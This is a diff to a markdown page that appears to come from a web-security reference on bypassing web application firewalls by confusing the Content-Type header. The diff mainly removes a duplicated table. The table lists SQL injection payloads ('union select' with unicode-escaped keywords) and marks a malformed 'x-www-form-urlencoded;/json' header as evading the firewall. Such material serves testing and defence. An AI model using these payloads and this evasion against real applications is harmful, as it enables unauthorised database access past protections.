@@ -22,17 +22,11 @@ Can be used in combination with attacks requiring boolean or array in HTTP reque
 
 ### Basic Idea
 
-| HTTP Request                                                                                      | Application                        | WAF                                                | Result                     |
-|---------------------------------------------------------------------------------------------------|------------------------------------|----------------------------------------------------|----------------------------|
-| Content-Type: application/x-www-form-urlencoded<br><br>q=' union select '1                        | ' union select 1'                  | ' union select 1'                                  | :heavy_minus_sign: Blocked |
-| Content-Type: application/json<br><br>{"q":"' \u0075nion \u0073elect '1"}                         | ' union select 1'                  | ' union select 1'                                  | :heavy_minus_sign: Blocked |
-| Content-Type: application/x-www-form-urlencoded;/json<br><br>{"q":"' \u0075nion \u0073elect '1"}  | ' union select 1'                  | {"q":"' \u0075nion \u0073elect '1"}                | :heavy_check_mark: Bypass  |
-
-| HTTP Request                                                                                      | Application                        | WAF                                                | Result                     |
-|---------------------------------------------------------------------------------------------------|------------------------------------|----------------------------------------------------|----------------------------|
-| Content-Type: application/x-www-form-urlencoded<br><br>q=' union select '1                        | ' union select 1'                  | ' union select 1'                                  | :heavy_minus_sign: Blocked |
-| Content-Type: application/json<br><br>{"q":"' \u0075nion \u0073elect '1"}                         | ' union select 1'                  | ' union select 1'                                  | :heavy_minus_sign: Blocked |
-| Content-Type: application/x-www-form-urlencoded;/json<br><br>{"q":"' \u0075nion \u0073elect '1"}  | ' union select 1'                  | {"q":"' \u0075nion \u0073elect '1"}                | :heavy_check_mark: Bypass  |
+| HTTP Request                                                                                      | Application         | WAF                                   | Result                     |
+|---------------------------------------------------------------------------------------------------|---------------------|---------------------------------------|----------------------------|
+| Content-Type: application/x-www-form-urlencoded<br><br>q=' union select '1                        | ' union select 1'   | ' union select 1'                     | :heavy_minus_sign: Blocked |
+| Content-Type: application/json<br><br>{"q":"' \u0075nion \u0073elect '1"}                         | ' union select 1'   | ' union select 1'                     | :heavy_minus_sign: Blocked |
+| Content-Type: application/x-www-form-urlencoded;/json<br><br>{"q":"' \u0075nion \u0073elect '1"}  | ' union select 1'   | {"q":"' \u0075nion \u0073elect '1"}   | :heavy_check_mark: Bypass  |
 
 **Interesting results**
  * [PHP multipart boundary parsing](ct-tricks/PHP.md)
